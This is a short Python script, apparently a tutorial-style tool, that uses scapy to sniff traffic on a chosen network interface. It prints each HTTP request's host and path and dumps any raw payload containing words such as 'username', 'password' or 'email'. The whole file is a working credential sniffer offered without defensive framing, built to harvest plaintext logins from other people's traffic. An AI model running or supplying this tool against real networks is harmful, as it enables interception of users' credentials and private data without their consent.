import scapy.all as scapy
import argparse
from scapy.layers import http


# Sniff packets
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("http request: " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print("\n\n\n!Username/password detected >>> " + load + "\n\n\n")
                    break


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on packets to sniff")

    arguments = parser.parse_args()
    arguments_i = arguments.interface

    sniff(arguments_i)


if __name__ == '__main__':
    main()
